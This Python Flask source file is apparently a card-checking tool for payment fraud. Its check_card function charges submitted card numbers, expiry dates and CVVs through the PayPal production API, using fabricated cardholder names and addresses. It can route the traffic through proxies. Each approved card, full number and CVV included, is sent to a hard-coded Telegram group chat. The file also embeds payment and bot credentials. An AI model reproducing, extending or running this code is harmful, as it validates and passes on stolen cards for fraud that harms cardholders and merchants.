from flask import Flask, render_template, request, Response, stream_with_context
import os
import requests
import random
import time
import json
import uuid
import asyncio
import threading
from base64 import b64encode
from telegram import Bot
from telegram.error import TelegramError

app = Flask(__name__)

# PayPal API credentials - PRODUCTION ONLY
client_id = os.getenv("PAYPAL_CLIENT_ID", "ASfMCbQcRjWSydh7TkeCHxaERFpTkbAvjYZ-uI59sewzUPmc0virFawTQqOJGqQGIYTOZxVWxT8EvIrY")
client_secret = os.getenv("PAYPAL_CLIENT_SECRET", "EOFTz7KX6GZ2wQzCCJKAcsIBYbQTjK-yl-iMi4AfGkQiGlrz4aSOqwPDc_HpfZoNich2Q0UM9vXyk8cU")
PAYPAL_API_BASE = "https://api-m.paypal.com"

# Telegram Bot Tokens
TELEGRAM_USER_BOT_TOKEN = os.getenv("TELEGRAM_USER_BOT_TOKEN", "7663455992:AAE4Cz-oYACSd7ImX_5JjOkpv_SPYZjIRrI")
TELEGRAM_GROUP_BOT_TOKEN = os.getenv("TELEGRAM_GROUP_BOT_TOKEN", "7663455992:AAE4Cz-oYACSd7ImX_5JjOkpv_SPYZjIRrI")
# Telegram Group Chat ID for all hits
TELEGRAM_GROUP_CHAT_ID = "-1003430750905"

# Address pool
ADDRESSES = [
    {"address_line_1": "2400 E Commercial Blvd", "admin_area_2": "Fort Lauderdale", "admin_area_1": "FL", "postal_code": "33308"},
    {"address_line_1": "1750 E Las Olas Blvd", "admin_area_2": "Fort Lauderdale", "admin_area_1": "FL", "postal_code": "33301"},
    {"address_line_1": "500 S Australian Ave", "admin_area_2": "West Palm Beach", "admin_area_1": "FL", "postal_code": "33401"},
    {"address_line_1": "1801 NW 66th Ave", "admin_area_2": "Plantation", "admin_area_1": "FL", "postal_code": "33313"},
    {"address_line_1": "3801 PGA Blvd", "admin_area_2": "Palm Beach Gardens", "admin_area_1": "FL", "postal_code": "33410"},
    {"address_line_1": "1455 Market St", "admin_area_2": "Tallahassee", "admin_area_1": "FL", "postal_code": "32312"},
    {"address_line_1": "2929 W Broward Blvd", "admin_area_2": "Fort Lauderdale", "admin_area_1": "FL", "postal_code": "33312"},
    {"address_line_1": "5830 S Flamingo Rd", "admin_area_2": "Cooper City", "admin_area_1": "FL", "postal_code": "33330"},
    {"address_line_1": "4200 Parliament Pl", "admin_area_2": "Lanham", "admin_area_1": "MD", "postal_code": "20706"},
    {"address_line_1": "7979 Baltimore Annapolis Blvd", "admin_area_2": "Glen Burnie", "admin_area_1": "MD", "postal_code": "21061"},
    {"address_line_1": "1500 Forest Dr", "admin_area_2": "Annapolis", "admin_area_1": "MD", "postal_code": "21403"},
    {"address_line_1": "2301 York Rd", "admin_area_2": "Lutherville-Timonium", "admin_area_1": "MD", "postal_code": "21093"},
    {"address_line_1": "10300 Little Patuxent Pkwy", "admin_area_2": "Columbia", "admin_area_1": "MD", "postal_code": "21044"},
    {"address_line_1": "5505 Spectrum Dr", "admin_area_2": "Frederick", "admin_area_1": "MD", "postal_code": "21703"},
    {"address_line_1": "6751 Columbia Gateway Dr", "admin_area_2": "Columbia", "admin_area_1": "MD", "postal_code": "21046"},
    {"address_line_1": "1900 Towne Centre Blvd", "admin_area_2": "Annapolis", "admin_area_1": "MD", "postal_code": "21401"},
    {"address_line_1": "1401 Greenbrier Pkwy", "admin_area_2": "Chesapeake", "admin_area_1": "VA", "postal_code": "23320"},
    {"address_line_1": "2625 S Military Hwy", "admin_area_2": "Chesapeake", "admin_area_1": "VA", "postal_code": "23321"},
    {"address_line_1": "701 Lynnhaven Pkwy", "admin_area_2": "Virginia Beach", "admin_area_1": "VA", "postal_code": "23452"},
    {"address_line_1": "4554 Virginia Beach Blvd", "admin_area_2": "Virginia Beach", "admin_area_1": "VA", "postal_code": "23462"},
    {"address_line_1": "1000 N Mall Dr", "admin_area_2": "Virginia Beach", "admin_area_1": "VA", "postal_code": "23454"},
    {"address_line_1": "300 Monticello Ave", "admin_area_2": "Norfolk", "admin_area_1": "VA", "postal_code": "23510"},
    {"address_line_1": "880 N Military Hwy", "admin_area_2": "Norfolk", "admin_area_1": "VA", "postal_code": "23502"},
    {"address_line_1": "6551 E Virginia Beach Blvd", "admin_area_2": "Norfolk", "admin_area_1": "VA", "postal_code": "23502"},
    {"address_line_1": "2050 Old Greenbrier Rd", "admin_area_2": "Chesapeake", "admin_area_1": "VA", "postal_code": "23320"},
    {"address_line_1": "3400 W Mercury Blvd", "admin_area_2": "Hampton", "admin_area_1": "VA", "postal_code": "23666"},
    {"address_line_1": "12401 Jefferson Ave", "admin_area_2": "Newport News", "admin_area_1": "VA", "postal_code": "23602"}
]

NAMES = ["John Doe", "Jane Smith", "Bob Johnson", "Alice Williams", "Mike Brown", 
         "Sarah Davis", "Tom Wilson", "Emily Taylor", "David Martinez", "Lisa Anderson"]

RESPONSE_CODES = {"0000":"APPROVED","0100":"REFERRAL","5100":"GENERIC_DECLINE","5110":"CVV2_FAILURE","5120":"INSUFFICIENT_FUNDS","5170":"AVS_FAILURE","5180":"INVALID_CARD","5400":"EXPIRED_CARD","5650":"SCA_REQUIRED","9500":"FRAUD","9520":"LOST_STOLEN"}



def get_bin_info(card_number):
    try:
        r = requests.get(f"https://ompro.dev/bin.php?Bin={card_number[:6]}", timeout=3)
        if r.ok:
            d = r.json()
            return {"type":d.get("Credit/Debit","?"),"scheme":d.get("Brand","?"),"bank":d.get("Issuer","?"),"country":d.get("Country Name","?")}
    except: pass
    return {"type":"?","scheme":"?","bank":"?","country":"?"}

def send_telegram_message_sync(chat_id, message, bot_token):
    """Synchronous telegram sender for threading"""
    try:
        bot = Bot(token=bot_token)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(
            bot.send_message(chat_id=chat_id, text=message, parse_mode='HTML', 
                           read_timeout=10, write_timeout=10, connect_timeout=10)
        )
        loop.close()
        return True
    except: 
        return False

def parse_proxy(proxy_string):
    """Parse proxy string in format host:port:username:password"""
    if not proxy_string or not proxy_string.strip():
        return None
    parts = proxy_string.strip().split(':')
    if len(parts) >= 4:
        host, port, user, pwd = parts[0], parts[1], parts[2], ':'.join(parts[3:])
        proxy = f'http://{user}:{pwd}@{host}:{port}'
        return {'http': proxy, 'https': proxy}
    return None

def check_card(cc, mm, yy, cvv, start_time=None, **kwargs):
    """Check card using PayPal V2 API"""
    if start_time is None:
        start_time = time.time()
    
    proxies = parse_proxy(kwargs.get('proxy', ''))
    amount = kwargs.get('amount', '1.00')
    
    try:
        # Get access token
        auth_header = b64encode(f"{client_id}:{client_secret}".encode()).decode()
        token_response = requests.post(
            f"{PAYPAL_API_BASE}/v1/oauth2/token",
            headers={"Authorization": f"Basic {auth_header}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "client_credentials"},
            proxies=proxies,
            timeout=20
        )
        
        if token_response.status_code != 200:
            error_detail = token_response.text if token_response.content else "No response body"
            print(f"[ERROR] Auth failed: {token_response.status_code} - {error_detail}")
            return {"status": "error", "message": f"Auth failed: {token_response.status_code}"}
        
        access_token = token_response.json()["access_token"]
        expiry = f"20{yy[-2:]}-{mm}"
        
        # Create order with card
        order_response = requests.post(
            f"{PAYPAL_API_BASE}/v2/checkout/orders",
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {access_token}",
                "PayPal-Request-Id": str(uuid.uuid4())
            },
            json={
                "intent": "CAPTURE",
                "purchase_units": [{"amount": {"currency_code": "USD", "value": str(amount)}}],
                "payment_source": {
                    "card": {
                        "number": cc,
                        "expiry": expiry,
                        "security_code": cvv,
                        "name": random.choice(NAMES),
                        "billing_address": random.choice(ADDRESSES) | {"country_code": "US"}
                    }
                }
            },
            proxies=proxies,
            timeout=30
        )
        
        if not order_response.ok:
            error_data = order_response.json() if order_response.content else {}
            error_msg = error_data.get('message', f"HTTP {order_response.status_code}")
            if 'details' in error_data and error_data['details']:
                error_msg = error_data['details'][0].get('description', error_msg)
            return {"status": "declined", "message": f"declined:ERROR:{error_msg}"}
        
        order_data = order_response.json()
        order_id = order_data.get('id')
        order_status = order_data.get('status')
        elapsed = time.time() - start_time
        
        if order_status == "COMPLETED":
            for pu in order_data.get('purchase_units', []):
                for cap in pu.get('payments', {}).get('captures', []):
                    if cap.get('status') == "COMPLETED":
                        proc = cap.get('processor_response', {})
                        return {
                            "status": "success",
                            "message": f"approved:0000:APPROVED (AVS:{proc.get('avs_code','?')}, CVV:{proc.get('cvv_code','?')})",
                            "order_id": order_id,
                            "elapsed_time": elapsed,
                            "amount": amount
                        }
                    else:
                        code = cap.get('processor_response', {}).get('response_code', 'UNK')
                        return {"status": "declined", "message": f"declined:{code}:{RESPONSE_CODES.get(str(code), 'UNK')}", "order_id": order_id}
        
        elif order_status == "PAYER_ACTION_REQUIRED":
            return {"status": "success", "message": "approved:3DS:3DS_REQUIRED", "order_id": order_id, "elapsed_time": elapsed, "amount": amount, "card_valid": True}
        
        return {"status": "declined", "message": f"declined:UNKNOWN:{order_status}", "order_id": order_id}
            
    except Exception as e:
        return {"status": "error", "message": str(e)[:200]}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check_cards():
    data = request.json
    cards = data.get('cards', [])
    telegram_id = data.get('telegram_id', '')
    amount = data.get('amount', '1.00')
    proxy = data.get('proxy', '')
    
    def generate():
        for card in cards:
            try:
                parts = card.strip().split('|')
                if len(parts) != 4:
                    result = {
                        "card": card,
                        "status": "error",
                        "message": "Invalid format. Use: card|MM|YY|CVV"
                    }
                    yield f"data: {json.dumps(result)}\n\n"
                    continue
                
                cc, mm, yy, cvv = parts
                start_time = time.time()
                result = check_card(cc, mm, yy, cvv, start_time, amount=amount, proxy=proxy)
                result['card'] = f"{cc[:6]}...{cc[-4:]}"
                result['full_card'] = card
                
                # Send to Telegram if success
                if result['status'] == 'success':
                    bin_info = get_bin_info(cc)
                    elapsed = result.get('elapsed_time', 0)
                    
                    charge_amount = result.get('amount', '1.00')
                    telegram_msg = f"""#APPROVED [CHARGE]
CARD: {card}
Response: CHARGE ${charge_amount}

Bin Info: {bin_info['type']} - {bin_info['scheme']}
Bank: {bin_info['bank']}
Country: {bin_info['country']}

Time Taken: {elapsed:.2f}s"""
                    
                    # Send to user's telegram if telegram_id provided (using same bot)
                    if telegram_id:
                        threading.Thread(target=lambda: send_telegram_message_sync(telegram_id, telegram_msg, TELEGRAM_GROUP_BOT_TOKEN), daemon=True).start()
                    
                    # Always send to group chat (using same bot)
                    threading.Thread(target=lambda: send_telegram_message_sync(TELEGRAM_GROUP_CHAT_ID, telegram_msg, TELEGRAM_GROUP_BOT_TOKEN), daemon=True).start()
                
                # Send result immediately
                yield f"data: {json.dumps(result)}\n\n"
                
                # Small delay to avoid rate limiting
                time.sleep(0.3)
                
            except Exception as e:
                result = {
                    "card": card,
                    "status": "error",
                    "message": str(e)[:200]
                }
                yield f"data: {json.dumps(result)}\n\n"
        
        yield "data: [DONE]\n\n"
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5810, debug=True)
